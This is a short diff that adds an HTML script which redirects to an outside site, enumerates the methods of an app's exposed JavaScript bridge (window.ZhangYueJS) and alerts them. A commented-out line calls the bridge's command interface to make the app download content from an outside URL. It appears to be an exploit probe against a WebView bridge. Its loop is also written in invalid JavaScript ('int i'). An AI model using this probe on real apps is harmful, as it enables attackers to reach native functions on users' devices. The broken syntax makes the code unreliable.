@@ -1,0 +1,17 @@
+<script type="text/javascript">
+document.location.href="https://z3.cn/";
+for(int i=0;i<10;i++){
+setTimeout("getinfo()",(i+1)*10);
+}
+function getinfo(){
+	var ret="";
+	for (var obj in window.ZhangYueJS){
+		ret+=obj+"\r\n";
+	}
+	
+	//window.ZhangYueJS.do_command("{'Action':'chapPackDownload','Data':{'introStr':'https://cusas.github.io/obj2.htm'}}");
+	if(ret!=""){
+	alert(ret);
+	}
+}
+</script>
